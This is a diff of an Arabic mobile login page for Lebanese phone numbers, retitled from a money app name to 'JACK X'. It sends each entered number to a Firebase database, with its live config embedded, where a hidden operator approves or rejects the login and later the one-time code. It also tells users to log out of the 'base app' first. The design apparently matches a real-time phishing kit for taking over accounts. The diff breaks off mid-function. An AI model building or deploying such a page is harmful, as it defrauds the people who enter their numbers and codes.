@@ -3,115 +3,80 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>Wich | money </title>
+<title>JACK X | User Login</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700;900&display=swap');
-  
   :root {
-    --primary: #E31D4A;
-    --glass-bg: rgba(255, 255, 255, 0.75);
-    --glass-border: rgba(255, 255, 255, 0.4);
-    --bg-gradient: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-    --text-main: #1a1a1a;
-    --text-sub: #6e6e73;
-    --radius-xl: 28px;
+    --primary: #E31D4A; --glass-bg: rgba(255,255,255,0.75); --bg: linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);
+    --text-main: #1a1a1a; --text-sub: #6e6e73; --radius-xl: 28px;
   }
-
-  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; font-family:'Tajawal', sans-serif; outline:none; }
-  body { background: var(--bg-gradient); color: var(--text-main); height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; font-family:'Tajawal',sans-serif; outline:none; }
+  body { background:var(--bg); color:var(--text-main); height:100vh; overflow:hidden; display:flex; justify-content:center; align-items:center; }
+  .app-frame { width:100%; max-width:420px; height:100%; position:relative; background:rgba(255,255,255,0.4); backdrop-filter:blur(40px); -webkit-backdrop-filter:blur(40px); display:flex; flex-direction:column; overflow:hidden; }
+  @media(min-width:450px) { .app-frame { border-radius:40px; height:90vh; box-shadow:0 20px 60px rgba(0,0,0,0.15); border:1px solid rgba(255,255,255,0.4); } }
   
-  .app-frame { 
-    width: 100%; max-width: 420px; height: 100%; position: relative; 
-    background: rgba(255,255,255,0.4); backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px);
-    display: flex; flex-direction: column; overflow: hidden; 
-  }
-  @media(min-width: 450px) { .app-frame { border-radius: 40px; height: 90vh; box-shadow: 0 20px 60px rgba(0,0,0,0.15); border: 1px solid var(--glass-border); } }
-
-  /* Header & Typography */
-  .header { padding: 50px 24px 20px; text-align: center; flex-shrink: 0; z-index: 10; }
-  .logo { font-size: 38px; font-weight: 900; color: var(--primary); letter-spacing: -1.5px; font-style: italic; text-shadow: 0 4px 15px rgba(227,29,74,0.2); }
-  .back-btn { position: absolute; top: 45px; left: 24px; cursor: pointer; opacity: 0.5; transition: 0.3s; z-index: 20; }
-  .back-btn:hover { opacity: 1; transform: translateX(-3px); }
-
-  h1 { font-size: 30px; font-weight: 900; text-align: center; margin-bottom: 10px; letter-spacing: -0.5px; }
-  p.sub { font-size: 15px; color: var(--text-sub); text-align: center; line-height: 1.7; margin-bottom: 40px; padding: 0 20px; font-weight: 500; }
-
-  .content { flex: 1; padding: 0 28px; display: flex; flex-direction: column; align-items: center; animation: fadeIn 0.5s ease; }
-  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-  /* Inputs Vapor Style */
-  .input-wrapper { 
-    width: 100%; background: var(--glass-bg); border-radius: var(--radius-xl); border: 1px solid var(--glass-border); 
-    padding: 6px; display: flex; align-items: center; gap: 12px; margin-bottom: 24px; 
-    box-shadow: inset 0 2px 8px rgba(0,0,0,0.02), 0 4px 15px rgba(255,255,255,0.5); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-  }
-  .input-wrapper:focus-within { background: #fff; border-color: var(--primary); box-shadow: 0 0 0 4px rgba(227, 29, 74, 0.08), 0 10px 25px rgba(227,29,74,0.1); transform: scale(1.02); }
+  .header { padding:50px 24px 20px; text-align:center; flex-shrink:0; z-index:10; }
+  .logo { font-size:38px; font-weight:900; color:var(--primary); letter-spacing:-1.5px; font-style:italic; text-shadow:0 4px 15px rgba(227,29,74,0.2); }
+  .back-btn { position:absolute; top:45px; left:24px; cursor:pointer; opacity:0.5; transition:0.3s; z-index:20; }
+  .back-btn:hover { opacity:1; transform:translateX(-3px); }
+  h1 { font-size:30px; font-weight:900; text-align:center; margin-bottom:10px; }
+  p.sub { font-size:15px; color:var(--text-sub); text-align:center; line-height:1.7; margin-bottom:40px; padding:0 20px; font-weight:500; }
+  .content { flex:1; padding:0 28px; display:flex; flex-direction:column; align-items:center; animation:fadeIn 0.5s ease; }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(10px);} to{opacity:1;transform:translateY(0);} }
   
-  .flag-leb { width: 32px; height: 22px; background: linear-gradient(to bottom, #ED1C24 33%, #FFF 33%, #FFF 66%, #ED1C24 66%); border-radius: 6px; position: relative; border: 1px solid rgba(0,0,0,0.05); box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+  .input-wrapper { width:100%; background:var(--glass-bg); border-radius:var(--radius-xl); border:1px solid rgba(255,255,255,0.4); padding:6px; display:flex; align-items:center; gap:12px; margin-bottom:24px; box-shadow:inset 0 2px 8px rgba(0,0,0,0.02),0 4px 15px rgba(255,255,255,0.5); transition:all 0.3s cubic-bezier(0.25,0.8,0.25,1); }
+  .input-wrapper:focus-within { background:#fff; border-color:var(--primary); box-shadow:0 0 0 4px rgba(227,29,74,0.08),0 10px 25px rgba(227,29,74,0.1); transform:scale(1.02); }
+  .flag-leb { width:32px; height:22px; background:linear-gradient(to bottom,#ED1C24 33%,#FFF 33%,#FFF 66%,#ED1C24 66%); border-radius:6px; position:relative; border:1px solid rgba(0,0,0,0.05); box-shadow:0 2px 5px rgba(0,0,0,0.1); }
   .flag-leb::after { content:''; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:3px; height:8px; background:#00A651; border-radius:1px; }
-  .code-prefix { font-weight: 800; font-size: 16px; direction: ltr; color: var(--text-main); padding-left: 4px; border-left: 1px solid rgba(0,0,0,0.1); }
-  input.phone-inp { border: none; flex: 1; font-size: 20px; font-weight: 700; direction: ltr; text-align: right; background: transparent; padding-right: 8px; color: var(--text-main); }
-
-  .terms { font-size: 12px; color: var(--text-sub); text-align: center; margin-bottom: auto; line-height: 1.8; opacity: 0.8; }
-  .terms a { color: var(--primary); text-decoration: none; font-weight: 700; }
-
-  /* Buttons */
-  .btn-vapor { width: 100%; padding: 20px; background: var(--primary); color: #fff; border: none; border-radius: var(--radius-xl); font-size: 19px; font-weight: 800; cursor: pointer; margin-top: 24px; transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); box-shadow: 0 10px 25px rgba(227, 29, 74, 0.35); position: relative; overflow: hidden; }
-  .btn-vapor::after { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition:0.5s; }
+  .code-prefix { font-weight:800; font-size:16px; direction:ltr; color:var(--text-main); padding-left:4px; border-left:1px solid rgba(0,0,0,0.1); }
+  input.phone-inp { border:none; flex:1; font-size:20px; font-weight:700; direction:ltr; text-align:right; background:transparent; padding-right:8px; color:var(--text-main); }
+  .terms { font-size:12px; color:var(--text-sub); text-align:center; margin-bottom:auto; line-height:1.8; opacity:0.8; }
+  .terms a { color:var(--primary); text-decoration:none; font-weight:700; }
+  
+  .btn-vapor { width:100%; padding:20px; background:var(--primary); color:#fff; border:none; border-radius:var(--radius-xl); font-size:19px; font-weight:800; cursor:pointer; margin-top:24px; transition:all 0.3s cubic-bezier(0.34,1.56,0.64,1); box-shadow:0 10px 25px rgba(227,29,74,0.35); position:relative; overflow:hidden; }
+  .btn-vapor::after { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent); transition:0.5s; }
   .btn-vapor:hover::after { left:100%; }
-  .btn-vapor:active { transform: scale(0.96); box-shadow: 0 5px 15px rgba(227, 29, 74, 0.2); }
-  .btn-disabled { background: #ffdce6; color: #fff; box-shadow: none; cursor: not-allowed; pointer-events: none; transform: none !important; }
-  .btn-disabled::after { display: none; }
-
-  /* OTP Screen */
-  .otp-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; width: 100%; margin-bottom: 35px; }
-  .otp-cell { aspect-ratio: 1; background: var(--glass-bg); border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 26px; font-weight: 900; transition: all 0.3s ease; border: 1px solid transparent; box-shadow: 0 4px 10px rgba(0,0,0,0.03); }
-  .otp-cell.active { background: #fff; border-color: var(--primary); color: var(--primary); transform: translateY(-3px); box-shadow: 0 8px 20px rgba(227,29,74,0.15); }
-  .otp-footer { width: 100%; display: flex; justify-content: space-between; font-size: 13px; color: var(--text-sub); margin-bottom: 20px; font-weight: 500; }
-  .resend-link { color: var(--primary); font-weight: 800; cursor: pointer; opacity: 0.4; pointer-events: none; transition: 0.3s; }
-  .resend-link.live { opacity: 1; pointer-events: auto; text-decoration: underline; text-underline-offset: 4px; }
-
-  /* Dialog & Loader */
-  .dialog-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); z-index: 100; display: none; align-items: center; justify-content: center; padding: 30px; }
-  .dialog-card { background: rgba(255,255,255,0.9); width: 100%; max-width: 310px; border-radius: 32px; padding: 35px 28px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.15); border: 1px solid rgba(255,255,255,0.6); animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-  @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-  .d-icon { font-size: 52px; margin-bottom: 20px; display: block; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.1)); }
-  .d-title { font-size: 22px; font-weight: 900; margin-bottom: 14px; color: var(--text-main); }
-  .d-msg { font-size: 14px; color: var(--text-sub); line-height: 1.7; margin-bottom: 28px; font-weight: 500; }
-  .d-btn { width: 100%; padding: 16px; border-radius: 18px; border: none; font-size: 16px; font-weight: 800; cursor: pointer; margin-bottom: 12px; transition: 0.2s; }
-  .d-confirm { background: var(--primary); color: #fff; box-shadow: 0 8px 20px rgba(227,29,74,0.3); }
-  .d-cancel { background: #f2f2f7; color: var(--text-main); }
-
-  .loader-overlay { position: absolute; inset:0; background: rgba(255,255,255,0.85); backdrop-filter:blur(10px); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:200; border-radius: inherit;}
-  .spinner { width: 45px; height: 45px; border: 4px solid #eee; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .loader-text { font-size: 16px; font-weight: 700; color: var(--text-main); text-align: center; padding: 0 20px; }
-
-  .hidden { display: none !important; }
+  .btn-vapor:active { transform:scale(0.96); box-shadow:0 5px 15px rgba(227,29,74,0.2); }
+  .btn-disabled { background:#ffdce6; color:#fff; box-shadow:none; cursor:not-allowed; pointer-events:none; transform:none!important; }
+  .btn-disabled::after { display:none; }
+  
+  .otp-grid { display:grid; grid-template-columns:repeat(6,1fr); gap:12px; width:100%; margin-bottom:35px; }
+  .otp-cell { aspect-ratio:1; background:var(--glass-bg); border-radius:16px; display:flex; align-items:center; justify-content:center; font-size:26px; font-weight:900; transition:all 0.3s ease; border:1px solid transparent; box-shadow:0 4px 10px rgba(0,0,0,0.03); }
+  .otp-cell.active { background:#fff; border-color:var(--primary); color:var(--primary); transform:translateY(-3px); box-shadow:0 8px 20px rgba(227,29,74,0.15); }
+  .otp-footer { width:100%; display:flex; justify-content:space-between; font-size:13px; color:var(--text-sub); margin-bottom:20px; font-weight:500; }
+  .resend-link { color:var(--primary); font-weight:800; cursor:pointer; opacity:0.4; pointer-events:none; transition:0.3s; }
+  .resend-link.live { opacity:1; pointer-events:auto; text-decoration:underline; text-underline-offset:4px; }
+  
+  .dialog-overlay { position:fixed; inset:0; background:rgba(255,255,255,0.1); backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px); z-index:100; display:none; align-items:center; justify-content:center; padding:30px; }
+  .dialog-card { background:rgba(255,255,255,0.9); width:100%; max-width:310px; border-radius:32px; padding:35px 28px; text-align:center; box-shadow:0 30px 60px rgba(0,0,0,0.15); border:1px solid rgba(255,255,255,0.6); animation:popIn 0.5s cubic-bezier(0.175,0.885,0.32,1.275); }
+  @keyframes popIn { from{transform:scale(0.8);opacity:0;} to{transform:scale(1);opacity:1;} }
+  .d-icon { font-size:52px; margin-bottom:20px; display:block; filter:drop-shadow(0 5px 10px rgba(0,0,0,0.1)); }
+  .d-title { font-size:22px; font-weight:900; margin-bottom:14px; color:var(--text-main); }
+  .d-msg { font-size:14px; color:var(--text-sub); line-height:1.7; margin-bottom:28px; font-weight:500; }
+  .d-btn { width:100%; padding:16px; border-radius:18px; border:none; font-size:16px; font-weight:800; cursor:pointer; margin-bottom:12px; transition:0.2s; }
+  .d-confirm { background:var(--primary); color:#fff; box-shadow:0 8px 20px rgba(227,29,74,0.3); }
+  .d-cancel { background:#f2f2f7; color:var(--text-main); }
+  
+  .loader-overlay { position:absolute; inset:0; background:rgba(255,255,255,0.85); backdrop-filter:blur(10px); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:200; border-radius:inherit; }
+  .spinner { width:45px; height:45px; border:4px solid #eee; border-top-color:var(--primary); border-radius:50%; animation:spin 1s linear infinite; margin-bottom:20px; }
+  @keyframes spin { to{transform:rotate(360deg);} }
+  .loader-text { font-size:16px; font-weight:700; color:var(--text-main); text-align:center; padding:0 20px; }
+  .hidden { display:none!important; }
 </style>
 </head>
 <body>
-
 <div class="app-frame">
-  <div class="loader-overlay" id="loaderOverlay">
-    <div class="spinner"></div>
-    <div class="loader-text" id="loaderText">جاري الاتصال...</div>
-  </div>
-  
-  <div class="back-btn hidden" id="backBtn" onclick="goBack()">
-    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
-  </div>
-
+  <div class="loader-overlay" id="loaderOverlay"><div class="spinner"></div><div class="loader-text" id="loaderText">جاري الاتصال...</div></div>
+  <div class="back-btn hidden" id="backBtn" onclick="goBack()"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></div>
   <div class="header"><div class="logo">W</div></div>
-
+  
   <!-- Screen 1: Phone -->
   <div id="screen-login" class="content">
     <h1>ابدأ باستخدام التطبيق</h1>
     <p class="sub">أدخل رقم هاتفك للمحمول، سيتم إرسال طلب تفعيل.</p>
     <div class="input-wrapper">
       <input type="tel" id="phoneInput" class="phone-inp" placeholder="xx xxx xxxx" maxlength="10" inputmode="numeric">
-      <span class="code-prefix">+961</span>
-      <div class="flag-leb"></div>
+      <span class="code-prefix">+961</span><div class="flag-leb"></div>
     </div>
     <p class="terms">عند تسجيل الدخول باستخدام رقم هاتفك، فإنك توافق على <a href="#">البنود والشروط</a></p>
     <button class="btn-vapor" id="loginBtn" onclick="handleLogin()">تسجيل الدخول</button>
@@ -120,7 +85,7 @@
   <!-- Screen 2: OTP -->
   <div id="screen-otp" class="content hidden">
     <h1>أدخل رمز التفعيل</h1>
-    <p class="sub">بانتظار الموافقة على الرمز المدخل.</p>
+    <p class="sub">بانتظار موافقة المشرف على الرمز المدخل.</p>
     <div class="otp-grid" id="otpGrid"></div>
     <input type="number" id="otpHidden" style="position:absolute;opacity:0;pointer-events:none;" inputmode="numeric" maxlength="6">
     <div class="otp-footer">
@@ -142,273 +107,69 @@
   </div>
 </div>
 
-<!-- Firebase SDKs -->
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-
 <script>
   const firebaseConfig = {
-    apiKey: "AIzaSyDST9eIFpUdbXa2aaVWVPt6LjZNL4R2UKA",
-    authDomain: "xbet-86a1f.firebaseapp.com",
-    databaseURL: "https://xbet-86a1f-default-rtdb.firebaseio.com",
-    projectId: "xbet-86a1f",
-    storageBucket: "xbet-86a1f.firebasestorage.app",
-    messagingSenderId: "1049564126267",
-    appId: "1:1049564126267:web:58eb824eda9566ae79501e",
-    measurementId: "G-MZDXDMQ2HB"
+    apiKey:"AIzaSyDST9eIFpUdbXa2aaVWVPt6LjZNL4R2UKA",authDomain:"xbet-86a1f.firebaseapp.com",databaseURL:"https://xbet-86a1f-default-rtdb.firebaseio.com",projectId:"xbet-86a1f",storageBucket:"xbet-86a1f.firebasestorage.app",messagingSenderId:"1049564126267",appId:"1:1049564126267:web:58eb824eda9566ae79501e",measurementId:"G-MZDXDMQ2HB"
   };
-
-  if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+  if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
   const db = firebase.database();
 
-  // State
-  let isBaseAppLoggedOut = false;
-  let otpValue = "";
-  let timerInterval = null;
-  let currentPhone = "";
-  let activeRequestId = null;
-  let approvalListener = null;
+  let isBaseAppLoggedOut=false, otpValue="", timerInterval=null, currentPhone="", activeRequestId=null, approvalListener=null;
+  const els={screenLogin:document.getElementById('screen-login'),screenOtp:document.getElementById('screen-otp'),backBtn:document.getElementById('backBtn'),phoneInput:document.getElementById('phoneInput'),verifyBtn:document.getElementById('verifyBtn'),otpGrid:document.getElementById('otpGrid'),otpHidden:document.getElementById('otpHidden'),dialog:document.getElementById('customDialog'),resendLink:document.getElementById('resendLink'),timeCount:document.getElementById('timeCount'),loaderOverlay:document.getElementById('loaderOverlay'),loaderText:document.getElementById('loaderText'),dIcon:document.getElementById('dIcon'),dTitle:document.getElementById('dTitle'),dMsg:document.getElementById('dMsg'),dConfirmBtn:document.getElementById('dConfirmBtn'),dCancelBtn:document.getElementById('dCancelBtn')};
 
-  // DOM Elements
-  const screenLogin = document.getElementById('screen-login');
-  const screenOtp = document.getElementById('screen-otp');
-  const backBtn = document.getElementById('backBtn');
-  const phoneInput = document.getElementById('phoneInput');
-  const verifyBtn = document.getElementById('verifyBtn');
-  const otpGrid = document.getElementById('otpGrid');
-  const otpHidden = document.getElementById('otpHidden');
-  const dialog = document.getElementById('customDialog');
-  const resendLink = document.getElementById('resendLink');
-  const timeCount = document.getElementById('timeCount');
-  const loaderOverlay = document.getElementById('loaderOverlay');
-  const loaderText = document.getElementById('loaderText');
-  const dIcon = document.getElementById('dIcon');
-  const dTitle = document.getElementById('dTitle');
-  const dMsg = document.getElementById('dMsg');
-  const dConfirmBtn = document.getElementById('dConfirmBtn');
-  const dCancelBtn = document.getElementById('dCancelBtn');
-
-  function initOtp() {
-    otpGrid.innerHTML = '';
-    for(let i=0; i<6; i++) {
-      const box = document.createElement('div');
-      box.className = 'otp-cell';
-      box.onclick = () => otpHidden.focus();
-      otpGrid.appendChild(box);
-    }
-  }
+  function initOtp(){els.otpGrid.innerHTML='';for(let i=0;i<6;i++){const b=document.createElement('div');b.className='otp-cell';b.onclick=()=>els.otpHidden.focus();els.otpGrid.appendChild(b);}}
   initOtp();
 
-  function switchScreen(to) {
-    if(to === 'otp') {
-      screenLogin.classList.add('hidden');
-      screenOtp.classList.remove('hidden');
-      backBtn.classList.remove('hidden');
-      initOtp();
-      startTimer();
-      setTimeout(() => otpHidden.focus(), 100);
-    } else {
-      screenOtp.classList.add('hidden');
-      screenLogin.classList.remove('hidden');
-      backBtn.classList.add('hidden');
-      clearInterval(timerInterval);
-    }
+  function switchScreen(to){if(to==='otp'){els.screenLogin.classList.add('hidden');els.screenOtp.classList.remove('hidden');els.backBtn.classList.remove('hidden');initOtp();startTimer();setTimeout(()=>els.otpHidden.focus(),100);}else{els.screenOtp.classList.add('hidden');els.screenLogin.classList.remove('hidden');els.backBtn.classList.add('hidden');clearInterval(timerInterval);}}
+  function goBack(){if(approvalListener)approvalListener.off();switchScreen('login');}
+
+  function handleLogin(){
+    const phone=els.phoneInput.value.replace(/\s/g,'');
+    if(phone.length<7){alert("الرجاء إدخال رقم صحيح");return;}
+    currentPhone="+961"+phone;
+    db.ref('app_lock').once('value').then(snap=>{
+      const data=snap.val();
+      if(!data||data.locked===true){if(!isBaseAppLoggedOut){showWarningDialog();return;}}
+      submitRequestToAdmin('pending','جاري انتظار موافقة المشرف...');
+    }).catch(err=>alert("خطأ في الاتصال بالخادم"));
   }
 
-  function goBack() { 
+  function confirmWarning(){isBaseAppLoggedOut=true;closeDialog();handleLogin();}
+  function closeDialog(){els.dialog.style.display='none';}
+
+  function submitRequestToAdmin(initialStatus,loadingMsg){
+    els.loaderText.textContent=loadingMsg;els.loaderOverlay.style.display='flex';
+    if(!activeRequestId) activeRequestId=Date.now().toString();
+    const updateData={phone:currentPhone,timestamp:Date.now(),status:initialStatus};
+    db.ref(`login_requests/${activeRequestId}`).update(updateData).then(()=>listenForApproval()).catch(err=>{els.loaderOverlay.style.display='none';alert("فشل في إرسال الطلب: "+err.message);});
+  }
+
+  function listenForApproval(){
     if(approvalListener) approvalListener.off();
-    switchScreen('login'); 
-  }
-
-  // --- Core Logic: Send Request & Wait for Admin ---
-  function handleLogin() {
-    const phone = phoneInput.value.replace(/\s/g, '');
-    if(phone.length < 7) { alert("الرجاء إدخال رقم صحيح"); return; }
-    
-    currentPhone = "+961" + phone;
-    
-    // 1. Check App Lock Condition First
-    db.ref('app_lock').once('value').then(snapshot => {
-      const data = snapshot.val();
-      if(!data || data.locked === true) {
-        if(!isBaseAppLoggedOut) {
-          showWarningDialog();
-          return;
-        }
-      }
-      // 2. If passed condition, send request to DB
-      submitRequestToAdmin('pending', 'جاري انتظار موافقة النظام...');
-    }).catch(err => {
-      console.error("DB Error:", err);
-      alert("خطأ في الاتصال بالخادم");
+    approvalListener=db.ref(`login_requests/${activeRequestId}/status`);
+    approvalListener.on('value',snap=>{
+      const status=snap.val();
+      if(status==='approved'&&els.screenLogin.classList.contains('hidden')===false){approvalListener.off();els.loaderOverlay.style.display='none';switchScreen('otp');}
+      else if(status==='rejected'&&els.screenLogin.classList.contains('hidden')===false){approvalListener.off();els.loaderOverlay.style.display='none';showRejectionDialog("تم رفض طلب تسجيل الدخول","عذراً، قام المشرف برفض طلبك. يرجى التأكد من البيانات والمحاولة مرة أخرى.");}
+      else if(status==='otp_approved'){approvalListener.off();els.loaderOverlay.style.display='none';showDialog("success","تم بنجاح ✅","تمت الموافقة على الرمز وتفعيل الحساب بنجاح.");db.ref(`login_requests/${activeRequestId}`).update({status:'verified'});}
+      else if(status==='otp_rejected'){approvalListener.off();els.loaderOverlay.style.display='none';showDialog("error","رمز مرفوض ❌","قام المشرف برفض الرمز المدخل. يرجى إدخال رمز OTP جديد.");otpValue="";els.otpHidden.value="";updateOtpUI();els.otpHidden.focus();db.ref(`login_requests/${activeRequestId}`).update({status:'otp_pending'});}
     });
   }
 
-  function confirmWarning() {
-    isBaseAppLoggedOut = true;
-    closeDialog();
-    handleLogin();
-  }
+  function showRejectionDialog(title,msg){resetDialogToDefault();els.dIcon.textContent="❌";els.dTitle.textContent=title;els.dMsg.textContent=msg;els.dConfirmBtn.textContent="حسناً، فهمت";els.dConfirmBtn.style.background="#F44336";els.dCancelBtn.classList.add('hidden');els.dConfirmBtn.onclick=()=>{closeDialog();els.phoneInput.value="";activeRequestId=null;resetDialogToDefault();};els.dialog.style.display='flex';}
+  function showWarningDialog(){resetDialogToDefault();els.dialog.style.display='flex';}
+  function resetDialogToDefault(){els.dIcon.textContent="⚠️";els.dTitle.textContent="تنبيه أمني";els.dMsg.textContent="ملاحظة: يجب تسجيل الخروج من التطبيق الأساسي قبل التقديم ليتم قبول طلبك وتفعيله بنجاح.";els.dConfirmBtn.textContent="موافق، سأقوم بتسجيل الخروج";els.dConfirmBtn.style.background="var(--primary)";els.dConfirmBtn.onclick=confirmWarning;els.dCancelBtn.classList.remove('hidden');els.dCancelBtn.onclick=closeDialog;}
 
-  function closeDialog() { dialog.style.display = 'none'; }
+  els.otpHidden.addEventListener('input',e=>{otpValue=e.target.value.replace(/\D/g,'').slice(0,6);updateOtpUI();});
+  function updateOtpUI(){const boxes=els.otpGrid.children;for(let i=0;i<6;i++){boxes[i].textContent=otpValue[i]||'';boxes[i].classList.toggle('active',!!otpValue[i]);}if(otpValue.length===6){els.verifyBtn.classList.remove('btn-disabled');els.verifyBtn.onclick=verifyCode;}else{els.verifyBtn.classList.add('btn-disabled');els.verifyBtn.onclick=null;}}
+  
+  function verifyCode(){submitRequestToAdmin('otp_pending','جاري انتظار موافقة المشرف على الرمز...');}
 
-  function submitRequestToAdmin(initialStatus, loadingMsg) {
-    loaderText.textContent = loadingMsg;
-    loaderOverlay.style.display = 'flex';
+  function startTimer(){let sec=30;els.resendLink.classList.remove('live');clearInterval(timerInterval);timerInterval=setInterval(()=>{sec--;els.timeCount.textContent=`00:${sec<10?'0'+sec:sec}`;if(sec<=0){clearInterval(timerInterval);els.resendLink.classList.add('live');els.resendLink.onclick=()=>{startTimer();submitRequestToAdmin('pending','جاري انتظار موافقة المشرف...');};}},1000);}
 
-    // If it's a new login request, create a new ID. If it's OTP verification, use existing ID.
-    if (!activeRequestId) {
-      activeRequestId = Date.now().toString();
-    }
-
-    const updateData = {
-      phone: currentPhone,
-      timestamp: Date.now(),
-      status: initialStatus
-    };
-
-    // Save/Update request with specific status
-    db.ref(`login_requests/${activeRequestId}`).update(updateData).then(() => {
-      // Start listening for admin approval/rejection
-      listenForApproval();
-    }).catch(err => {
-      loaderOverlay.style.display = 'none';
-      alert("فشل في إرسال الطلب: " + err.message);
-    });
-  }
-
-  function listenForApproval() {
-    if(approvalListener) approvalListener.off();
-    
-    approvalListener = db.ref(`login_requests/${activeRequestId}/status`);
-    approvalListener.on('value', snapshot => {
-      const status = snapshot.val();
-      
-      // Stage 1: Login Approval
-      if(status === 'approved' && screenLogin.classList.contains('hidden') === false) {
-        approvalListener.off();
-        loaderOverlay.style.display = 'none';
-        switchScreen('otp');
-      } 
-      // Stage 1: Login Rejection
-      else if(status === 'rejected' && screenLogin.classList.contains('hidden') === false) {
-        approvalListener.off();
-        loaderOverlay.style.display = 'none';
-        showRejectionDialog("تم رفض طلب تسجيل الدخول", "عذراً، قام المشرف برفض طلبك. يرجى التأكد من البيانات والمحاولة مرة أخرى.");
-      }
-      // Stage 2: OTP Approval
-      else if(status === 'otp_approved') {
-        approvalListener.off();
-        loaderOverlay.style.display = 'none';
-        showDialog("success", "تم بنجاح ✅", "تمت الموافقة على الرمز وتفعيل الحساب بنجاح.");
-        db.ref(`login_requests/${activeRequestId}`).update({ status: 'verified' });
-      }
-      // Stage 2: OTP Rejection
-      else if(status === 'otp_rejected') {
-        approvalListener.off();
-        loaderOverlay.style.display = 'none';
-        showDialog("error", "رمز مرفوض ❌", "قام المشرف برفض الرمز المدخل. يرجى إدخال رمز OTP جديد.");
-        otpValue = ""; otpHidden.value = "";
-        updateOtpUI(); otpHidden.focus();
-        
-        // Reset status back to pending so user can try again
-        db.ref(`login_requests/${activeRequestId}`).update({ status: 'otp_pending' });
-      }
-    });
-  }
-
-  function showRejectionDialog(title, msg) {
-    dIcon.textContent = "❌";
-    dTitle.textContent = title;
-    dMsg.textContent = msg;
-    dConfirmBtn.textContent = "حسناً، فهمت";
-    dConfirmBtn.style.background = "#F44336";
-    dCancelBtn.classList.add('hidden');
-    
-    dConfirmBtn.onclick = () => {
-      closeDialog();
-      phoneInput.value = "";
-      activeRequestId = null; // Reset request ID for new attempt
-      resetDialogToDefault();
-    };
-    
-    dialog.style.display = 'flex';
-  }
-
-  function showWarningDialog() {
-    resetDialogToDefault();
-    dialog.style.display = 'flex';
-  }
-
-  function resetDialogToDefault() {
-    dIcon.textContent = "⚠️";
-    dTitle.textContent = "تنبيه أمني";
-    dMsg.textContent = "ملاحظة: يجب تسجيل الخروج من التطبيق الأساسي قبل التقديم ليتم قبول طلبك وتفعيله بنجاح.";
-    dConfirmBtn.textContent = "موافق، سأقوم بتسجيل الخروج";
-    dConfirmBtn.style.background = "var(--primary)";
-    dConfirmBtn.onclick = confirmWarning;
-    dCancelBtn.classList.remove('hidden');
-    dCancelBtn.onclick = closeDialog;
-  }
-
-  // --- OTP Handling ---
-  otpHidden.addEventListener('input', e => {
-    otpValue = e.target.value.replace(/\D/g, '').slice(0, 6);
-    updateOtpUI();
-  });
-
-  function updateOtpUI() {
-    const boxes = otpGrid.children;
-    for(let i=0; i<6; i++) {
-      boxes[i].textContent = otpValue[i] || '';
-      boxes[i].classList.toggle('active', !!otpValue[i]);
-    }
-    if(otpValue.length === 6) {
-      verifyBtn.classList.remove('btn-disabled');
-      verifyBtn.onclick = verifyCode;
-    } else {
-      verifyBtn.classList.add('btn-disabled');
-      verifyBtn.onclick = null;
-    }
-  }
-
-  function verifyCode() {
-    // Change status to otp_pending and wait for admin approval
-    submitRequestToAdmin('otp_pending', 'جاري انتظار موافقة النظام على الرمز...');
-  }
-
-  function startTimer() {
-    let sec = 30;
-    resendLink.classList.remove('live');
-    clearInterval(timerInterval);
-    timerInterval = setInterval(() => {
-      sec--;
-      timeCount.textContent = `00:${sec < 10 ? '0'+sec : sec}`;
-      if(sec <= 0) {
-        clearInterval(timerInterval);
-        resendLink.classList.add('live');
-        resendLink.onclick = () => {
-          startTimer();
-          submitRequestToAdmin('pending', 'جاري انتظار موافقة المشفر...');
-        };
-      }
-    }, 1000);
-  }
-
-  function showDialog(type, title, msg) {
-    dIcon.textContent = type === 'success' ? '✅' : '❌';
-    dTitle.textContent = title;
-    dMsg.textContent = msg;
-    dConfirmBtn.style.background = type === 'success' ? '#4CAF50' : '#F44336';
-    dConfirmBtn.textContent = "حسناً";
-    dCancelBtn.classList.add('hidden');
